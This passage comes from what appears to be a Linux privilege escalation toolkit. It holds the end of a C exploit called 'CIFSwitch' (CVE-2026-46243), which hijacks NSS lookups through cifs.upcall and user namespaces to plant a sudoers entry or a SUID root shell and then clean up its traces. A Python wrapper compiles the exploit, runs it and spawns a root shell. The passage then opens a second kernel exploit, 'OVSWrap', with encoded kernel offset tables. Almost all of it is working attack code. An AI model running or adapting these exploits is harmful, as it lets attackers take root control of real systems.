        "/usr/lib/aarch64-linux-gnu", "/lib", "/usr/lib"
    };
    int n = 0;
    for (int i = 0; i < 8 && n < 8; i++) {
        char p[512];
        snprintf(p, sizeof(p), "%s/libnss_files.so.2", cand[i]);
        if (access(p, F_OK) == 0) {
            strncpy(dirs[n], cand[i], 255);
            dirs[n][255] = 0;
            n++;
        }
    }
    return n;
}

int main(void) {
    char workdir[] = "/tmp/cifswitch_XXXXXX";
    char username[128];
    char nss_dirs[8][256];
    int ndirs;
    int ret = 1;

    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    printf("[*] CIFSwitch - CVE-2026-46243\n");

    if (!has_upcall()) {
        printf("[-] cifs.upcall not found (cifs-utils not installed?)\n");
        return 1;
    }
    if (!has_gcc()) {
        printf("[-] gcc not found (needed to compile NSS library)\n");
        return 1;
    }
    if (user_name(username, sizeof(username)) != 0) {
        printf("[-] cannot determine user name\n");
        return 1;
    }
    printf("[+] User: %s\n", username);

    ndirs = detect_nss_dirs(nss_dirs);
    if (ndirs == 0) {
        printf("[-] no NSS library directory found\n");
        return 1;
    }
    printf("[+] NSS lib dirs: %d\n", ndirs);

    if (!mkdtemp(workdir)) { perror("mkdtemp"); return 1; }
    printf("[+] Workdir: %s\n", workdir);

    {
        char nsp[1024];
        snprintf(nsp, sizeof(nsp), "%s/nsswitch.conf", workdir);
        FILE *f = fopen(nsp, "w");
        if (!f) { perror("nsswitch.conf"); goto out; }
        fprintf(f, "passwd: pwn files\n");
        fprintf(f, "group:  pwn files\n");
        fprintf(f, "shadow: files\n");
        fclose(f);
    }

    printf("[*] Compiling NSS library...\n");
    if (compile_nss(workdir, username) != 0) goto out;
    printf("[+] NSS library compiled\n");
    fflush(stdout);

    pid_t child = 0;
    child = fork();
    if (child == 0) {
        if (unshare(CLONE_NEWUSER | CLONE_NEWNS) != 0) {
            fprintf(stderr, "[-] unshare failed: %s\n", strerror(errno));
            _exit(1);
        }
        if (write_uid_map(getuid()) != 0) { perror("uid_map"); _exit(1); }
        if (write_gid_map(getgid()) != 0) { perror("gid_map"); _exit(1); }

        mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL);
        autoload_cifs();
        mask_dir("/run/nscd");
        mask_dir("/var/run/nscd");

        {
            char nsp[1024];
            snprintf(nsp, sizeof(nsp), "%s/nsswitch.conf", workdir);
            bind_nsswitch(nsp);
        }

        for (int i = 0; i < ndirs; i++)
            mount(workdir, nss_dirs[i], NULL, MS_BIND | MS_REC, NULL);

        setup_keyring();

        char desc[768];
        snprintf(desc, sizeof(desc),
            "ver=0x2;host=example.com;ip4=127.0.0.1;sec=krb5;"
            "uid=0x0;creduid=0x0;pid=%d;upcall_target=app;user=root",
            getpid());

        printf("[*] Triggering cifs.upcall (pid=%d)...\n", getpid());
        errno = 0;
        long r = xrequest_key(desc);
        printf("[*] request_key: %ld (errno=%d)\n", r, errno);
        sleep(3);
        _exit(0);
    } else if (child > 0) {
        int st;
        waitpid(child, &st, 0);
    } else {
        perror("fork"); child = -1; goto out;
    }

    {
        struct stat st;
        if (stat("/etc/sudoers.d/cifswitch_pwn", &st) == 0) {
            printf("[+] sudoers entry created\n");
            ret = 0;
            goto out;
        }
        if (stat("/var/tmp/cifswitch_rootsh", &st) == 0) {
            printf("[+] SUID root shell created at /var/tmp/cifswitch_rootsh\n");
            ret = 0;
            goto out;
        }
        printf("[-] No sudoers entry or root shell found\n");
    }

out:
    if (child > 0) {
        pid_t c2 = fork();
        if (c2 == 0) {
            if (unshare(CLONE_NEWUSER | CLONE_NEWNS) == 0) {
                for (int i = 0; i < ndirs; i++) {
                    struct stat st;
                    char p[512];
                    snprintf(p, sizeof(p), "%s/%s", workdir, "libnss_pwn.so.2");
                    if (stat(p, &st) != 0) continue;
                    umount(nss_dirs[i]);
                }
                umount("/etc/nsswitch.conf");
                umount("/usr/etc/nsswitch.conf");
            }
            _exit(0);
        }
        if (c2 > 0) waitpid(c2, NULL, 0);
    }

    {
        char p[1024];
        snprintf(p, sizeof(p), "%s/nss_pwn.c", workdir); unlink(p);
        snprintf(p, sizeof(p), "%s/nsswitch.conf", workdir); unlink(p);
        snprintf(p, sizeof(p), "%s/libnss_pwn.so.2", workdir); unlink(p);
        snprintf(p, sizeof(p), "%s/evidence.txt", workdir); unlink(p);
        rmdir(workdir);
    }

    if (ret == 0) {
        printf("[+] Success! Run 'sudo -n sh' for a root shell.\n");
    } else {
        printf("[-] Exploit did not succeed on this system.\n");
    }
    return ret;
}
'''
def _cve_2026_46243_cleanup(*paths):
    for p in paths:
        try:
            os.remove(p)
        except OSError:
            pass


def _cve_2026_46243_compile_and_run():
    """Tulis source C, compile, jalankan. Return True kalau root."""
    cc = shutil.which("gcc") or shutil.which("cc")
    if not cc:
        log("[-] No gcc/cc — skip compile")
        return False
    log("[+] compiler: %s" % cc)

    tag = "%08x" % (os.getpid() ^ int(time.time()))
    c_path = "/tmp/.cf_%s.c" % tag
    bin_path = "/tmp/.cf_%s" % tag

    try:
        with open(c_path, "w") as f:
            f.write(CVE_2026_46243_C_SOURCE)
    except OSError as e:
        log("[-] write source: %s" % e)
        return False

    log("[*] compiling...")
    try:
        r = subprocess.run(
            [cc, "-O2", "-w", "-o", bin_path, c_path],
            capture_output=True, timeout=300
        )
        if r.returncode != 0:
            err = r.stderr.decode(errors="replace")[:400]
            log("[-] compile failed: %s" % err)
            _cve_2026_46243_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] compile error: %s" % e)
        _cve_2026_46243_cleanup(c_path, bin_path)
        return False

    if not os.path.isfile(bin_path):
        log("[-] binary not produced")
        _cve_2026_46243_cleanup(c_path, bin_path)
        return False

    try:
        os.chmod(bin_path, 0o755)
    except OSError:
        pass
    log("[+] compiled: %s" % bin_path)

    log("[*] running CIFSwitch (timeout 300s)...")
    try:
        p = subprocess.Popen([bin_path])
        try:
            p.wait(timeout=300)
            rc = p.returncode
        except subprocess.TimeoutExpired:
            p.kill()
            try:
                p.wait(timeout=5)
            except Exception:
                pass
            log("[-] timeout")
            _cve_2026_46243_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] run error: %s" % e)
        _cve_2026_46243_cleanup(c_path, bin_path)
        return False

    _cve_2026_46243_cleanup(c_path, bin_path)

    # verifikasi: sudoers.d atau SUID rootsh
    if os.path.exists("/etc/sudoers.d/cifswitch_pwn"):
        return True
    if os.path.exists("/var/tmp/cifswitch_rootsh"):
        try:
            st = os.stat("/var/tmp/cifswitch_rootsh")
            if st.st_mode & 0o4000:
                return True
        except OSError:
            pass
    if os.geteuid() == 0:
        return True
    if rc == 0:
        return True
    return False


def try_cve_2026_46243():
    log("\n[=== METHOD 12: CVE-2026-46243 (CIFSwitch — cifs.upcall + NSS confusion) ===]")

    if os.geteuid() == 0:
        log("[+] already root")
        _reattach_tty()
        os.execl("/bin/sh", "sh")
        return True

    arch = os.uname().machine
    if arch not in ("x86_64", "amd64", "aarch64", "arm64"):
        log("[-] unsupported arch (got %s)" % arch)
        return False

    if _cve_2026_46243_compile_and_run():
        log("[+++] CIFSwitch succeeded — root obtained")
        # Coba dua jalur sukses
        if os.path.exists("/etc/sudoers.d/cifswitch_pwn"):
            log("[+] sudoers entry ready — spawn root via sudo -n")
            _reattach_tty()
            try:
                os.execl("/bin/sh", "sh", "-c", "sudo -n /bin/bash -p")
            except OSError:
                pass
        if os.path.exists("/var/tmp/cifswitch_rootsh"):
            log("[+] SUID rootsh ready — exec")
            _reattach_tty()
            try:
                os.execl("/var/tmp/cifswitch_rootsh", "bash", "-p")
            except OSError:
                pass
        _reattach_tty()
        os.execl("/bin/sh", "sh")
        return True

    log("[-] CIFSwitch failed")
    return False

# ──────────────────────────────────────────────────
# METHOD 13: CVE-2026-64531 (OVSWrap — OVS arbitrary R/W)
# ──────────────────────────────────────────────────

OVSWRAP_PY_SOURCE = r'''#!/usr/bin/env python3
from __future__ import annotations

import base64
import errno
import json
import os
import pwd
import re
import shutil
import socket
import struct
import subprocess
import sys
import time
import zlib
from dataclasses import dataclass, fields
from typing import Any


NLMSG_HDR = "IHHII"
GENL_HDR = "BBH"
NLA_HDR = "HH"

NLM_F_REQUEST = 1
NLM_F_ACK = 4
NLM_F_CREATE = 0x400
NETLINK_GENERIC = 16
GENL_ID_CTRL = 0x10
NLMSG_ERROR = 2
CTRL_CMD_GETFAMILY = 3
CTRL_ATTR_FAMILY_ID = 1
CTRL_ATTR_FAMILY_NAME = 2

OVS_DATAPATH_VERSION = 2
OVS_FLOW_VERSION = 1

OVS_DP_CMD_NEW = 1
OVS_DP_ATTR_NAME = 1
OVS_DP_ATTR_UPCALL_PID = 2
OVS_DP_ATTR_USER_FEATURES = 5

OVS_FLOW_CMD_NEW = 1
OVS_FLOW_CMD_DEL = 2
OVS_FLOW_CMD_GET = 3
OVS_FLOW_ATTR_KEY = 1
OVS_FLOW_ATTR_ACTIONS = 2

OVS_KEY_ATTR_IN_PORT = 3
OVS_KEY_ATTR_ETHERNET = 4
OVS_KEY_ATTR_ETHERTYPE = 6
OVS_KEY_ATTR_IPV4 = 7
OVS_KEY_ATTR_TCP = 9
OVS_KEY_ATTR_TUNNEL = 16
OVS_KEY_ATTR_TCP_FLAGS = 18
OVS_KEY_ATTR_TUNNEL_INFO = 31

OVS_ACTION_ATTR_CT = 12
OVS_ACTION_ATTR_CLONE = 20
OVS_ACTION_ATTR_OUTPUT = 1
OVS_ACTION_ATTR_SET = 3
OVS_ACTION_ATTR_POP_VLAN = 5

OVS_CT_ATTR_COMMIT = 1
OVS_CT_ATTR_LABELS = 4
OVS_CT_ATTR_HELPER = 5
OVS_CT_ATTR_TIMEOUT = 9

OVS_TUNNEL_KEY_ATTR_IPV4_SRC = 1
OVS_TUNNEL_KEY_ATTR_IPV4_DST = 2
OVS_TUNNEL_KEY_ATTR_TOS = 3
OVS_TUNNEL_KEY_ATTR_TTL = 4
OVS_TUNNEL_KEY_ATTR_TP_SRC = 9
OVS_TUNNEL_KEY_ATTR_TP_DST = 10
OVS_TUNNEL_KEY_ATTR_IPV4_INFO_BRIDGE = 16

ETH_P_IP = 0x0800
IPPROTO_TCP = 6

BTF_DIR = "/sys/kernel/btf"
NLA_HEADER_SIZE = 4
KERNEL_BASE_SYMBOL = "_text"
REQUIRED_SYMBOLS = (
    KERNEL_BASE_SYMBOL,
    "module_ktype",
    "init_pid_ns",
)
HOST_USER_ENV = "OVS_C004_HOST_USER"
HOST_WRITER_PID_ENV = "OVS_C004_HOST_WRITER_PID"
HOST_WRITER_TRIGGER_FD_ENV = "OVS_C004_HOST_WRITER_TRIGGER_FD"
HOST_WRITER_ACK_FD_ENV = "OVS_C004_HOST_WRITER_ACK_FD"
SUDOERS_FILE = "/etc/sudoers"
SUDOERS_DROPIN_DIR = "/etc/sudoers.d"
CARRIER_TIMEOUT = "timeout"
CARRIER_LABELS_ONLY = "labels-only"
CARRIER_AUTO = "auto"
CARRIER_ORDER = (CARRIER_TIMEOUT, CARRIER_LABELS_ONLY)
CT_ACTION_COUNT = 400


def align4(value: int) -> int:
    return (value + 3) & ~3


def nla(attr_type: int, payload: bytes) -> bytes:
    length = 4 + len(payload)
    if length > 0xFFFF:
        raise ValueError(f"netlink attribute too long: {length}")
    return (
        struct.pack(NLA_HDR, length, attr_type)
        + payload
        + (b"\x00" * (align4(length) - length))
    )


def cstr(value: str) -> bytes:
    return value.encode("ascii") + b"\x00"


@dataclass(frozen=True)
class Attr:
    attr_type: int
    payload: bytes
    raw_len: int


@dataclass(frozen=True)
class SymbolOffsets:
    module_ktype: int
    init_pid_ns: int


@dataclass(frozen=True)
class KernelOffsets:
    nf_conntrack_helper_me: int
    module_kobj_ktype: int
    vmlinux_module_ktype: int
    vmlinux_init_pid_ns: int
    task_pid: int
    task_cred: int
    task_pid_links: int
    cred_fsuid: int
    cred_fsgid: int
    cred_cap_permitted: int
    cred_cap_effective: int
    pid_namespace_idr: int
    idr_idr_rt: int
    idr_base: int
    xarray_xa_head: int
    xa_node_shift: int
    xa_node_slots: int
    pid_tasks: int
    hlist_head_first: int
    dst_entry_ref: int
    dst_entry_ref_kind: str
    metadata_dst_tun_info: int
    ip_tunnel_key_ipv4_src: int
    ip_tunnel_key_ipv4_dst: int
    ip_tunnel_key_tos: int
    ip_tunnel_key_ttl: int
    ip_tunnel_key_tp_src: int
    ip_tunnel_key_tp_dst: int
    ovs_ct_labels: int
    ovs_ct_action_len: int


@dataclass(frozen=True)
class TunnelReadLane:
    name: str
    field_offset: int
    attr_type: int
    payload_index: int
    optional_zero: bool


@dataclass(frozen=True)
class KernelBuildRecord:
    release: str
    version: str
    machine: str
    offsets: KernelOffsets
    read_carrier: str
    write_carrier: str
    read_lanes: tuple[str, ...]
    ovs_key_attr_tunnel_info: int


KERNEL_RECORDS_DESCRIPTION = "the embedded pre-derived kernel record table"

# BEGIN EMBEDDED KERNEL RECORDS
_KERNEL_RECORDS_B85 = (b"c-rmVU2h%7+2;H6=TkJYPZBtbsJiQ=tLw~&Y~ay`Y~zuGAbT(n7RhCqTQn(9q!VSZ{n>X{FH&lf-Mw0?Sxu_>&u}mqiIEeE`uX-%_sjqKucG)r_5Ur3KmE2o`t{^&^QTz+>EFS>@%B%D-TuV+FTZ@)Tz;s3V*8o(4;@`>j^7-u-@n=X^2_Gv^5pmQA9Mb%_kRBU=Hj=L%gfDi{qr{5{`p@%ygf-jZshKdUo}52pFjWj!{wXJ+2zH@Hy4{<>Ywtq`={Q#J2^}L(LcR;b8&Q)KKIk-{d#&*f99{7b^RAOx%hBdf0p|6lPAX)Zw}WV(*FwWZ~bWczZZ8t`Td*AtFyDs>6>?(k8e)i|8CzLH@}{iq0jknaa4a!==qe(^AESbgm-@W{q<kNtNzc}{uNyBU*hsK{dD>1r+?dAu8-H3>-0;fPkeK7_RD$t!pr9`?{DYFSErjd@6HeZ-#70rKfZ6iMDqE+#Mv)zj?T~OumAe!UH#QPt$)Mc{FXk+e*T>E-#@%Lx_q;)zfsQ5-kfgEnlH1x`}3#k!_Dc3+yBw`C&zEj*1v5&yk8$}(r?DC---0Im+KGjKHUC&OF#4`eJeHJT<*?Kyx)FvmDb+-@i(U@XU#7rq4l5o{kQsuul`+sbxtmu&pJz=VssE~TmMyWKJDf!cJsw5mAAI_-|pY*H)rR^n>QbRJ^AJKH`b@0IX%C;^L6<5`r=~!@lE|1={q=mA2mPo|K0o%t-pflw|ISdd2#bwe)F4IU4PC+`qn?Hf1Q&}`YQhE^5nP8`PJp0+CP1|KHH?f^8fnum8riiKYy9(Z=lcrpXU4Rjk@<E`qq!6Z!Ptw<_G@wr@zwaX8ULDPwqh51GVy6A2@s94>qUOoATf`KfiA-KGfeg>C^u&UA%tvQ}NUPeD~d}pMHMx;-5c!`|7{{R(yYPQoLG!EVL_>jbfq>#dj}$E<}mH`BnaPadNro`k((_*Iz{xL_rip!ADlG{`Y$-`193ft6)__7<Cn;LO~RKjtaU*P|(<pPwP<7NQHt!3WoAPt7`?rLHc)JD&gy^vqnO(^|xnKy2h~h`_F$vLL@}OCnTZv;aN*~_eWZvbMt4T{aK%Wtn2fn<HyXMAG`Bc{q$qH<Hw}q$IKVn{l#vtFN>G8-M+42qfyam3Ru{NZ3<Y}&d#>%&Gt?FDpjF%bhX=*+qjL}l-s!dl-*7-Nh-I?LfdGnC?(}KY{NEe!*+JI&E9PPV{_cFtyL3~glG+J<2G*NHg0Ek+wJZ4&%a)6-PVN)(dlR%ZsRs?6K{WY{TUCUp!U(2D2}ig1yPXdmFhKn^;+)j_N()4SS(VgGK!Aksa|m#x2axn`w6>!lNP65XcMi8rlj7+ZQQ2b#_jBGSJUh5Dy7BBMN7Sn+qjL}xSic?*?)#5O<^aujVhFnBGEF1joY|QPJ-L{-Ij^(lBY#oZmZ}dIz>zZ+ptZ!4ckwd?WWv5O*1Sy8i`7%wqYB#VH>uyvpsc&<+KRtQBs#tv*`o2VVjTyw)3-XA0Q-2z1tF<CnSMw*rwWs?XQFF5VehpRub5TZP<qG{A|04Er6$mHYwb;DjF7j;5KfPlHm5&;<k-0b#D`s;5KekZ{v1$xBcW^5^b;JZJJ4N8@H*qar<j=TTIGHYPYGkaT~X(w{bhS+tuV}NinJ3)*)KXcH=f~Q*Yz;Q+E5Nd0V8(Ny^kuLcNXKxQ*Mmo!M=pCcjHcnWk=36-DDVZsRsN32x_h+f6FBzkPpEXqPrh*(zO3ASQur*oJM`&d#=(@G6<EqU);Z0yI(RCV_3(hHcoMfo(hCQ8KYDp-2gd;?50h!}b$o+i<0E5Wy+|xM$URQU6|~UOH7*t(J@!{@`yW{(S3udWb($303Qos@78Jy}(Y7dZ}Kusa(}6I?j9HHD2R2UT5~&PAITH)_;T=uyr&vVE{H@12$l12HWoi_V*VjTd-aIrz~n86<`B4U;{Q_X9hd$1$OF}YhLiwb%pI%zXaHT4cK2J*t?L_Y8sMdLQ+{)`GX`#&W5D7t^XB6NR}ETmsQp3YVUWxbXQ!e2J9-D0N8*H*nkb#S;3b58Z$m^H)>J{mzMYAHD2R2UgLFEuVq4keOmaYzAmHVnGdh=8n5v>v)69#1iRV#?3$~FKH5i|RB2h#3AU3Suzfe!Ey(u)d-KcD+2vOTwv}CAyPaU$VX&>)33eOguLf-04YpLlc7kmyKLEB@VHeo-pE2uNzvVq(r_XaLFkihGuw4zdR>7>^zT0$B9jeve53kNHuNty%TIY<aRgSLysBVaM5Dn1~ot0=OyE`$O&kL=8N`dI55Pe>M)1Q8s(%0v~1*K6Mr75IQI<wNYuaK@(o9J!UaaQ}BcFCy_#XvMfLo|gnL}w?uzmOhMT6C*L52aBWr86pRwHVj>O7tmRf1Xv`MOmEEZuR!)eJ9bjE9<E1XQiTZ(UcGk(GWdPA+4PsRY;4r6w(VMx+m+<ZKAh*(`WU!RH3VAOsjDkq9Gch^Aasa*-=D?pdfm2L=R*geM*apN}^FHjnXJRQzC6fJ{krd4Hu`hU#<W3p_6EHH;%r(WTHc~J}L{*5Dn49(GZ=T=)O4G-KwImHrp4&GF8#KB<p}^h$fDP=vj#FiKFE{(ao5l=qNU7f)0p=XyRyy&QJ6}96g}4HBoDnMro8Ljz;OsN|(KH^u5-*=EYDIx=b@HieYewhUl5%Xyr;jCXUwHv0!O=MEAwfzD@L}9n&Te?Lu8hLo`G~G;uUU=O?-+jyCsa3{RV79X=Wz9dR^7L-cHM^hlyBh+Z7gp*QGoT~%}<It>^`<sllPA)25AqO%j-7j%?8&xLgr?Ic<@bwD&k6LdiI3`F+?9rkV&{q5D;v`k4%v?YCa5Dn4v-9hvmL=W`c*}gd1MJc0UcQi_)G;uUa=T^GvjiY^E)?uQqq9%@pXo#LG>+qEyMYNQ}(aR&cFYCDXV)%OVz6ecEhmD5e6@*4;q7H=4FZ4jv;rat<#~?ULqcl+mO6OO)QoT_}dB5}S^m^l+siIIwLo`Iwc?Z$?iSFyXtM2cOu8Fp3yT8^Pn}ukICXI&ZS%~gQqy62Uj+90xqRXg#v;-Xx4bgK29oCH6rDT+1m(ucx9*Cp;-E~SSjuxpuqOzO>M`@HMjz;PHO6%S@I^4}VnioTx;%G&4G(<!6EuxKT{b~<Pv>J7QrT#n)uq>14|6E;k*3nw2yZzD4nXIx|9j#f{fzl|=qajMqp>)rq;T@w}y?5y*xQmukh8T^}yc%Nk3`Y078s6)@`|;?q@XdCA8?8fVghpr{4G}uK&;yT#Wq)gj`1%8-Q5vP^QhHn+Z4`C%;*^%&N5iTs>JXPUDp?a1Gb|7d(L5SL^bADzKN{-JV}@lK23MXj7L-Qm`5q0+5i2{=qoJ^}V}VNdJ{sz~VMkL*t7e0=j)plFjK=7>9u0$xTdQOhMlaClo=3xb9n$I1P)wmz)b$5<SRfjrc{POS{6r7D8iwB1j&#zH<~xuEX&wzhIycg$@6qs1gLKNHQ)7p&(h!R>QDHPjV>Ed*M&~!WH;<OCE&pj_M-8+v#DdWnJ(tlsRHFtBb>$c|T%yrEd34p4N2ha!K1$%p5TYS^zNo`_H7e@RhUUBF5j~JcS6z9u)JogvB)Sr%Q5vP^X^|eav7`PxHg+sfX*<*+ZSJ>7pQb?;(Mf4)X_Q83;trIaLFt~jqht5oi_K9XsgO2h6o`gsh$ilU==?<Y#~pW-{@f*<M#6Q}jD*89Ow)h|)47>;{SA21X>@aq1)?DuqKTv-dLE+tBWc@pGfTTd*)(oQmo!SFG+ojtJ%iG{UDCF@kk&pr6QzP^h=yoh4Iw%|(eK7Aze}%%FV|;H|DB6sqWNUB$7qbkXr2u*I+xKy&xZH*-~Dj@d;M)yC>_&&C3cj;G)&LMv=5^$gd6c(2wxi0zW>?Kbd9oTlMWkNAC<vqjK=7h-VMhj(&^ohM0$}%_rDvuu6IMJng%=@EtND%qx4+whGE2-()4a<SyQ?|rF-8E-Q7^SsibYHq+P{nLyX4g*&Yrn?Zc>t!_ty=EYRq_hr@dt@S2B1U+9n$Y2$e~#AuA>;Si&<8$I-J*vGU;Z8ZHIFb&f@9Kv*drpx|^L)#U1NJy(Y(s4ru4lx>|c{s%A8I10KIP^U$|F_dDoX$dNl;+_OrDssO_u<fY4IFBpZqQ1Iiibmt#%LZ6F?t50-;LQNos9l|b6EeWY1*W9tBxj-#%PSroJf~$+?{YE)X~c`dg$Ts-ZV>Mx=A~Xiq@bsN~1LIhA5p`>Cpdf=<X8T429c5m#Ix!JJJq}#%SIRF*?7|{qKfl?>1?xxyu65AkDKONY8<E@3Y}OqMJfmrDsEJqT&cGMq@OQG)Ct)dMJ{%cbDKbFNdL7-4R*~mdK=G8m7slVLB7jRevV!?_COCpQR2wZKIOt=<dL1jGil#4%N8hS(f{TOEkJalMX$7(sd=ROjLou1Eo=#P#UGPE8QDPhn`A0Jsegoqp74Z8l#zI!RUNOzZ<(u`qlcPXoyY|hlCvv4bgK2(n0%i?}im&$FhjlO7#cQ_j)^;1$a{Ebls3gLyX4g*`f}uWZa!_uV|89p3%KgN7Z+Pwu)LsCm4;<7){iH(fN&jH)j1^YQ9TRhYrmmX&W7NG)7}IJ<=GR-{_$pY2TYjTOTd!{!tpGNu*Iax6-;lkq$iz@U|yebcxXzjnTA7V|0F_dt0Qnx|?^TnQ&bdN@Ci9$8sf<Mrqy+Q98fUeeZ_%jczJwos3TXccdK{jnTXtV)P6~zZ<pw?rPHn(rHO)NJ~3D*U=b_(HPCUAx392dg$G-yt_-fVcI07U1+T-g=v_EX+mk3&cw6~h0^+NcSp0RRHvuI`a^Rm9Hmj3zyqc8E8QD-gu9{ix9=|s?b5)Zt&OHp8ly3qzyqW68$A?wguA(PV!BKthsLv~6s1v`MroAJue9lHl)l~G@p+ad9SV0*X^4hsh^7M%qO%j-+kq!N<AypqRVxkA5Dn2}9T1(J=%K8m>WZY(4m=la84VMMFb&g$9Wb4nY1<!m=&njyR8vY@cHm(&Mw516^c+U_rX8khmPMDzXsM#3NgAUun)W-4p26sMWA=8W?MkoKA5&jPI%^meL_;)06LmmzZlYa()FEB7hDN10+9-POFdCzYIxu<;qkE$c+qbr(imHm1<~xkWXrc~`p26sMW2V8kb@azVT#BQ088zK^7>&_%-(hrqqX)Y0ZZq9Vq@^Z03QD6iN|Q*VbZ(`6e<E$}65Z_V@YiXFVUaXOV>F30M&~!WH<5N-3p;ePNLrWCc#Otqj3({C=<G%hr5$qr;qYVqZB?i;)*k}XFb&f@9Kv*Nrpx|^Lvwf5@a5H6x^1Y_5DSqsMq@OQG)Ct)I`l`<?(WWxR7W?Pl~jm^ad3!+XcB3N&QEl2B3<@0cGN`cXc#qwXo#LG=@28Ml8&GVq!&nZU(#XkR?#Wx5SuQ98y6jEG)7}IkA@hX-{_%7L)#Nbi;CJu$AVIrhG_z6n9j{~)gMUvo@v7rcX*}^F&d+1yAVDqkxrjSBE3kX`!9rt`_G0KjnZ`)?W3@_1Eo=#cSDrUuXOLbVd$@<o#Gq|Mq@N-2S(3f^iU}6?lS%I>a@_NS+68f!!%68G=T?9XJ%Tfp}?c+T2yLubKB5Fp-~#8QJP{JrE@E-`=1U&-@IXn;-VOg#%PSDlE&!#M)y|IqPnhxYnLi%RYk>F7L-P5o(@quztVkAhobv8cW4`Jz-Wxd=$X=v%GyzBhZBrmn$gmqc2s>chudKm8l^EBqi3t5Ll{>_dp6)L&*<JdTJG1;r-eyGONc_$0nrdmAPv#EiMB(5wCPzTt!*?C6%BYOjnXKM(z%uPLrS~;NLrct1Eo<KrDsxFk6N*$bjgaP#VK75Dedpp(oHCB(p-3gnq{RZjnXqc96GUK%)_AzLMXi~rLC;qZq7CrCr6!3JLwt?PsOx~&PMZTeTRc-n1*SXhUqL!n_;HA4``XD4NpbuU>c@jdZso!qeiviNeCp<3uD?2GhN=_;88Q(+@dw6mKvsE8m3_yrn55b^dQq--_NE`3z5|4Aud{&hH03FX_(H;^l&!q<^EjDX?j9bRkR^mfoYhAX_$uTyi5;g)85>@O8f2A+jN!IM^i=}P#UFCdM2f<8F%qeag}yyO8a4@Z}sE7USBp!S7`uINwglNQ5vOD8m03pT@EW<-i<t7Z{8QWOeX-+`EUc%Fb&f%4bxef_G*yn^4{jsACE2zotmaqI(vxHD2>uHDeYR{^FvDO*7rC{FGA_zHjh%@jXWBqb)iDkWmL?zz%)$5G)!k^diedYytj3!VcHh8(N4D}#bFwzVH&1kIuFysvn{2)JA(Mb`R|EoQK@NK6MDcjOv5xxXJ$GKGkyQ`;rguDF2{2$$3tn9o=@r0je9^eEXP}z(&g|2Vo*Iw`?SvE^VTJlMro8rX_U^R^zZ{>xOe>U`^{nD3z2ATbgVE%X_Q83l+LX5@cUu7w;S)(`l41^n<!N@oYq2VltyWk&aCwC^I@=EN~aB`AzDo_4bw0U(=eT#>ESW);QN@?QR&vsC76b3n1*SX&cpQZoOmejZS#14kw#lYnzJpmdB8MG!!%51X1W??y6QS8?o#F<sx>E$(kPA6D2>utln%pf9+keId3<cn0aQ`dA7mad4bw0U)0vre!%Vx*8;Dh!6W6>T!Zb|J$aHA^RR@`_1g4k8^zaK}b#KvhVp>$1ZBdWgkLUa_(=9)4GcDarw<-{ro|9=&OJdsgFx~pLyU(<<b{ErD=`w`f7scz(3-UZyn6|jx!Cw70vx6F~gK*#uHmBig^X}j_LTv=)UXq|w;A>Rz(~F<65BsnW`zTR!m8eFfw%Qz+13T90?XB+9>xN|ATo-&atBDhc6P}>et#8X)R_mcS!O5;TK}v5*Yj^H5YCf;@k9J+q=pL)LU+&fU+382T{vxmafv&k$2gjR3tq*Kit$#c2R$4bo|MWlKefR38pWnRr=MUe$`tQFLFE)oK>$4*LGP;zN{-gPYu5|I|<n~IrmG*z><-7g+2H_A6;d>Kqtg-FGuYH8qpXb{D00ZHRBmC&}{OTCUfgH%G#ew{5g}j<Xxa}fbN(hH=2&Wc@@OcQIUW)@ckOMijIFLUc<W5Z@+}|g>Tq%KY2#4@FYH=Gz)#BO*2wyJY(`#`c2XY{%7T*VQ`UxKZaXpFevWssS;G6bB=!WiRUxP#UgU~&_{swRW2k^(Ky`8e7YVRNxz!wC#l__MqYPF@>t+cF+f@-LS>a0{tB_nF>^m&e2dudcpuCW0dumPLe8nEX8yPOn<sFnHL5~u=HLp4-WTSIjos;B4IfDPDyO>GU>Gk`sLmq}~%-9a@}Lp8NEROg}kL3Wk^Hedrbwe=%|y#u?+dp%lX;2!2+4(6y!sY`Rzr4O{f1F!)bu&GM{J2TkR_jHUK>xOEmhU$l@t#@BB+}75u?{TPJ1l13+j{~p)8?dRZ0XsL?lXq`?rdkt&Ks8iTTSIjwsvl(624Dj=VBZ4UDCxPE8`KckmFxt&6g>*;`ttyLNnmRuD{adI5q+@!?LTKVx@O>9Znxb(Uu}wS-(M6(D71;%MrVt^|NOUfKG#7vbVE0EL-)heZCBc<nr=ItZjt&UN=>&wH*`ZcbVGM$x}~Pu?N9eVHpj)Q^~a(p3sps}qN|`Ax}kd(x^++^t}Ld{vx<WN3!>Yqnr>UuE&J2`>in#Dd39D4QfL>oj#fc8bVE0ELw82HbxpUMMt2HK65YBi>XKWkXiMmZZs>+?=*~;Guj#hcRJu=#LKiwjrK2J+fo|xAZs^WUcX=RAO`!YNtA=i^3T>lx(FN#+Zs>+?=*~#DUFlNQbnEF=w|1#H&>5<3=!Wk3=r+cWqT4$<OqN7<S<@{w-476$NLA=6N~raQZs>+?=!Wk6bbCK7F!}cCZE6mz={AZE6X=F+=!WjRbcdR5Q`24UPxtGqvxaW5g)-6UsF<dNZs>+?=*~#DQ#IZ8Kx)1x1tzaI?~9_U|2##}Q9N`*H*`ZcbZ4a7)O5Q832HjsVv6K;6@@`~=!S0ShVGnnyP9ra(>-w{=f|VVChK;o!$cf(LpO9oH*{yD+t+lLHQjzX-J;X_Dea>pFoAC9hHmK2Nq2gt3^m<h+76Q+&VMfolcp(6{Q=$34c*WU-I?hQ>Od+xjqVqlqcjMwT<vyrGzUUAbk9Y1rDY7=m9)N>q5JEnyQ=BdHQnWOy0`nfjb`a9bVE0ELwA0<Wjft2*Jt$~rb6pzY-@*!hi>SGZs>;Y2dCTXnr>6m9VQOK*K|vn0u!ZM&4JJj-Ovr)(4B#9Q`7Bhx+m^1`F?YlrYW_L#zhO=&<)+t4c$5Ewkuuv1EVHPQ+|JOQoLGU6opT8>$>VT&<)+t4c*Y4k#1kpUDkBFX<2uoyB1qj%}9=iZs>+?=!Wi$bca<f?12&W02kqPq06XL)C#(x8@izzx--*l4vbM#1Cx)<fioMGYfV!^H*`ZcbVK*U(_N~X?r>mqH8n7)>9%S8lq;jAIS{&`8@i!8Gu>KE3rs#$-5~`g&PS)A8@izzx}iHW-KM5nPrH(n=+-vv>#p@S4!WTmx}h7oGtw<J-M*%KLSXWb&2dAws6zQP2yZNOLpO9oH+1Kx+dKr_Wz!reOjANPbVE0E=cU`$be9LlPVDP`